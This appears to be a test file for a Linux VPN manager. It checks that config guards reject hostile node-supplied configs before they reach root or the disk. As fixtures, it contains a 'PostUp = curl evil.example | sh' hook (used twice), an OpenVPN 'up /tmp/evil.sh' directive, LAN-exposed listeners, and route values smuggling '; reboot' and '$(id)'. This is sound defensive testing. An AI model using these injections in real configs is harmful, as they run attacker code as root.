import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { EventEmitter } from 'node:events'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { loadModule, type ModuleHarness } from '../../../test/harness/module.ts'
import { read } from '../../../test/harness/source.ts'

// vpn-manager is where node-supplied config meets root and the user's process table.
// These pin the order at its sinks (docs/invariants/node-trust.md [NT-1],
// reliability.md [REL-7], packaging.md [PKG-1]): pin the endpoint, guard the config,
// and only then write it or hand it to root; a bundled binary that fails its pin is
// refused, never swapped for whatever is on PATH.

const vm = await loadModule({
  entries: ['src/main/vpn/vpn-manager.ts'],
  fake: ['src/main/helper/privileged'],
  stubs: { child_process: 'test/harness/child-process.ts', fs: 'test/harness/fs.ts' },
})

// wg-quick and v2ray "installed": executables in a temp dir put first on PATH.
const bin = mkdtempSync(join(tmpdir(), 'kv-bin-'))
const resources = mkdtempSync(join(tmpdir(), 'kv-resources-'))
const savedPath = process.env.PATH
const ownTmp = new Set(readdirSync(tmpdir()))
before(() => {
  for (const name of ['wg-quick', 'v2ray', 'xray', 'hysteria']) {
    writeFileSync(join(bin, name), '#!/bin/sh\n')
    chmodSync(join(bin, name), 0o755)
  }
  process.env.PATH = `${bin}:${savedPath}`
  ;(process as { resourcesPath?: string }).resourcesPath = resources
})
after(() => {
  process.env.PATH = savedPath
  rmSync(bin, { recursive: true, force: true })
  rmSync(resources, { recursive: true, force: true })
  // vpn-manager makes its own private temp dir at import, once per fresh instance.
  for (const d of readdirSync(tmpdir())) if (d.startsWith('katacomb-vpn-') && !ownTmp.has(d)) rmSync(join(tmpdir(), d), { recursive: true, force: true })
})

const CLEAN_WG = (endpoint: string) => [
  '[Interface]', 'PrivateKey = aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd28=', 'Address = 10.8.0.2/32', '',
  '[Peer]', 'PublicKey = aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd28=', 'AllowedIPs = 0.0.0.0/0', `Endpoint = ${endpoint}`, '',
].join('\n')

/** A spawned core as far as vpn-manager looks at one; no pid, so nothing is tracked in /proc. */
function fakeChild(): EventEmitter {
  return Object.assign(new EventEmitter(), { pid: undefined, exitCode: null, stdout: new EventEmitter(), stderr: new EventEmitter(), kill: () => true })
}

/** The katacomb-vpn-* temp dirs that exist now. */
const ourDirs = () => readdirSync(tmpdir()).filter((d) => d.startsWith('katacomb-vpn-'))

function fresh(opts: { spawn?: boolean; execSync?: (cmd: string) => unknown } = {}): ModuleHarness & { privileged: string[][]; secureTmp: string } {
  const privileged: string[][] = []
  const before = new Set(ourDirs())
  const h = vm.fresh({
    'helper/privileged': { runPrivileged: async (a: string[]) => { privileged.push(a) } },
    child_process: {
      // No interface exists yet; getent resolves wg.example to a documentation address.
      execSync: opts.execSync ?? (() => { throw new Error('Device "sntl0" does not exist.') }),
      execFileSync: (cmd: string, args: string[]) => {
        if (cmd === 'getent' && args[1] === 'wg.example') return Buffer.from('198.51.100.5    STREAM wg.example\n')
        throw new Error(`unexpected ${cmd}`)
      },
      spawn: () => {
        if (!opts.spawn) throw new Error('nothing may be spawned in this test')
        return fakeChild()
      },
    },
    // openvpn is a system package: "installed" here whatever the machine has.
    fs: { existsSync: (p: string) => p === '/usr/sbin/openvpn' || existsSync(p) },
  })
  // The private dir this instance made at import: where its configs would be written.
  const [secureTmp] = ourDirs().filter((d) => !before.has(d))
  return Object.assign(h, { privileged, secureTmp: join(tmpdir(), secureTmp) })
}

type Connect = (cfg: string, ...rest: unknown[]) => unknown

test('[NT-1] a WireGuard config the guard rejects never reaches root or the disk', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  const evil = CLEAN_WG('203.0.113.7:51820').replace('[Peer]', 'PostUp = curl evil.example | sh\n\n[Peer]')
  await assert.rejects(async () => (h.mod.connectWireGuardFromConfig as Connect)(evil))
  assert.deepEqual(h.privileged, [])
  assert.deepEqual(readdirSync(h.secureTmp), [], 'the rejected config was never written')
})

test('[REL-7] [NT-1] control: a clean config is pinned to IPv4 first, then written 0600 and handed to root', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  await (h.mod.connectWireGuardFromConfig as Connect)(CLEAN_WG('wg.example:51820'))
  assert.equal(h.privileged.length, 1)
  const [verb, file] = h.privileged[0]
  assert.equal(verb, 'up')
  assert.match(readFileSync(file, 'utf-8'), /^Endpoint = 198\.51\.100\.5:51820$/m, 'root sees the pinned IP, never the hostname')
  assert.equal(statSync(file).mode & 0o777, 0o600)
})

test('[NT-1] a V2Ray config the guard rejects is never written or spawned', (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  // A SOCKS inbound on every interface would open the user's tunnel to the LAN.
  const cfg = JSON.stringify({
    inbounds: [{ protocol: 'socks', listen: '0.0.0.0', port: 1080 }],
    outbounds: [{ protocol: 'vmess', settings: { vnext: [{ address: '203.0.113.7', port: 443 }] } }],
  })
  assert.throws(() => (h.mod.connectV2RayFromConfig as Connect)(cfg))
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

test('[PKG-1] a bundled core that fails its pin is refused, never swapped for the one on PATH', (t) => {
  mkdirSync(join(resources, 'linux/bin'), { recursive: true })
  writeFileSync(join(resources, 'linux/bin/v2ray'), 'tampered')
  t.after(() => rmSync(join(resources, 'linux'), { recursive: true, force: true }))
  const h = fresh()
  t.after(() => h.dispose())
  assert.throws(() => (h.mod.connectV2RayFromConfig as Connect)('{}'), /integrity/)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

// The other four sinks: AmneziaWG and OpenVPN are handed to root, Xray and Hysteria2
// are spawned as the user. The same order holds at each: pin, guard, then write.

const corpus = (name: string) => read(`daemon/internal/guard/testdata/corpus/${name}`)
const CLEAN_AWG = (endpoint: string) => corpus('amneziawg/clean.conf').replace('Endpoint = 203.0.113.10:51820', `Endpoint = ${endpoint}`)
const CLEAN_OVPN = corpus('openvpn/clean.conf')
const CLEAN_XRAY = (address: string) => JSON.stringify({
  inbounds: [{ protocol: 'socks', listen: '127.0.0.1', port: 1080 }],
  outbounds: [{ protocol: 'vless', settings: { vnext: [{ address, port: 443 }] } }, { protocol: 'freedom' }],
})
const CLEAN_HY2 = (server: string) => JSON.stringify({
  server,
  auth: '11111111-2222-3333-4444-555555555555',
  tls: { insecure: true, pinSHA256: 'b3:7a:2f:9c:1d:44:e8:05:6a:cc:91:0f:23:5e:88:d1:47:b0:9a:3c:6e:12:fd:84:55:aa:e1:38:7c:90:2b:6f' },
  socks5: { listen: '127.0.0.1:1080' },
  lazy: true,
})
const written = (h: ModuleHarness, i = 0) => {
  const args = h.world.calls('child_process', 'spawn')[i].args[1] as string[]
  return readFileSync(args[args.indexOf('-c') + 1], 'utf-8')
}

test('[NT-1] an AmneziaWG config the guard rejects never reaches root or the disk', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  const evil = CLEAN_AWG('203.0.113.7:51820').replace('[Peer]', 'PostUp = curl evil.example | sh\n\n[Peer]')
  await assert.rejects(async () => (h.mod.connectAmneziaWgFromConfig as Connect)(evil), /not allowed/)
  assert.deepEqual(h.privileged, [])
  assert.deepEqual(readdirSync(h.secureTmp), [])
})

test('[REL-7] [NT-1] control: a clean AmneziaWG config is pinned to IPv4, then written 0600 and handed to root', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  await (h.mod.connectAmneziaWgFromConfig as Connect)(CLEAN_AWG('wg.example:51820'))
  assert.equal(h.privileged.length, 1)
  const [verb, file] = h.privileged[0]
  assert.equal(verb, 'awg-up')
  assert.match(readFileSync(file, 'utf-8'), /^Endpoint = 198\.51\.100\.5:51820$/m)
  assert.equal(statSync(file).mode & 0o777, 0o600)
})

test('[NT-1] an OpenVPN config the guard rejects never reaches root or the disk', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  // openvpn runs `up` as root: the directive the guard exists for.
  const evil = CLEAN_OVPN.replace('\nclient\n', '\nclient\nup /tmp/evil.sh\n')
  await assert.rejects(async () => (h.mod.connectOpenVpnFromConfig as Connect)(evil))
  assert.deepEqual(h.privileged, [])
  assert.deepEqual(readdirSync(h.secureTmp), [])
})

test('[NT-1] control: a clean OpenVPN config is written 0600 and handed to root', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  await (h.mod.connectOpenVpnFromConfig as Connect)(CLEAN_OVPN)
  assert.equal(h.privileged.length, 1)
  const [verb, file] = h.privileged[0]
  assert.equal(verb, 'ovpn-up')
  assert.equal(readFileSync(file, 'utf-8'), CLEAN_OVPN)
  assert.equal(statSync(file).mode & 0o777, 0o600)
})

test('[NT-1] an Xray config the guard rejects is never spawned', (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  const evil = CLEAN_XRAY('203.0.113.7').replace('"listen":"127.0.0.1"', '"listen":"0.0.0.0"')
  assert.throws(() => (h.mod.connectXRayFromConfig as Connect)(evil), /loopback|listen|not allowed/i)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

test('[REL-7] [NT-1] control: a clean Xray config is pinned to IPv4 before xray is spawned on it', (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  ;(h.mod.connectXRayFromConfig as Connect)(CLEAN_XRAY('wg.example'))
  const cfg = JSON.parse(written(h)) as { outbounds: Array<{ settings?: { vnext?: Array<{ address: string }> } }> }
  assert.equal(cfg.outbounds[0].settings?.vnext?.[0].address, '198.51.100.5', 'xray never re-resolves the node through its own tunnel')
})

test('[NT-1] a Hysteria2 config the guard rejects is never spawned', (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  const evil = CLEAN_HY2('203.0.113.7:34567').replace('127.0.0.1:1080', '0.0.0.0:1080')
  assert.throws(() => (h.mod.connectHysteria2FromConfig as Connect)(evil), /loopback/)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

test('[REL-7] [NT-1] control: a clean Hysteria2 config is pinned to IPv4 before hysteria is spawned on it', (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  ;(h.mod.connectHysteria2FromConfig as Connect)(CLEAN_HY2('wg.example:34567'))
  assert.equal((JSON.parse(written(h)) as { server: string }).server, '198.51.100.5:34567')
})

test('[NT-1] split-tunnel routes reach root only as the guard passes them: tun-up never carries a hostile entry', async (t) => {
  let tun = false
  const h = fresh({
    spawn: true,
    execSync: (cmd: string) => {
      if (cmd === 'ip route show default') return Buffer.from('default via 192.168.1.1 dev eth0 proto dhcp metric 100\n')
      if (cmd === 'ip link show sntl-tun' && tun) return Buffer.from('')
      throw new Error(`Device does not exist (${cmd})`)
    },
  })
  t.after(() => h.dispose())
  writeFileSync(join(h.world.userData, 'settings.json'), JSON.stringify({
    splitTunnelRoutes: ['192.168.50.0/24', '10.0.0.0/8 ; reboot', '$(id)', '1.2.3.4/33', '172.16.0.0/12,0.0.0.0/0'],
  }))
  ;(h.mod.connectV2RayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'))
  const up = (h.mod.bringUpV2RayTunnel as () => Promise<void>)()
  tun = true
  await up
  assert.equal(h.privileged.length, 1)
  const argv = h.privileged[0]
  assert.deepEqual(argv.slice(0, 6), ['tun-up', '-', '127.0.0.1:1080', '203.0.113.7', '192.168.1.1', 'eth0'])
  assert.equal(argv[6], '192.168.50.0/24', 'only the well-formed CIDR crosses into root')
})

test('[REL-18] [PRO-7] a live core is not a tunnel: tunnel mode reads connected only once tun2socks is up, proxy mode at once', (t) => {
  let tun = false
  const exec = (cmd: string) => {
    if (cmd === 'ip link show sntl-tun' && tun) return Buffer.from('')
    throw new Error(`Device does not exist (${cmd})`)
  }
  const status = (h: ModuleHarness) => (h.mod.getConnectionStatus as () => { connected: boolean; proxyMode: boolean })()

  const tunnel = fresh({ spawn: true, execSync: exec })
  t.after(() => tunnel.dispose())
  ;(tunnel.mod.connectV2RayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'))
  assert.equal(tunnel.mod.isProxyChildAlive(), true, 'the core survived startup')
  assert.equal(status(tunnel).connected, false, 'but the polkit dialog for tun-up is still open: traffic leaves by the NIC')
  tun = true
  assert.equal(status(tunnel).connected, true)

  tun = false
  const proxy = fresh({ spawn: true, execSync: exec })
  t.after(() => proxy.dispose())
  ;(proxy.mod.connectV2RayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'), null, { proxyOnly: true })
  assert.deepEqual([status(proxy).connected, status(proxy).proxyMode], [true, true], 'in proxy mode the core is the whole connection')
  assert.equal(proxy.mod.isVpnActive(), false, 'but no system traffic is redirected, so chain reads must not fall back to the cache')
})
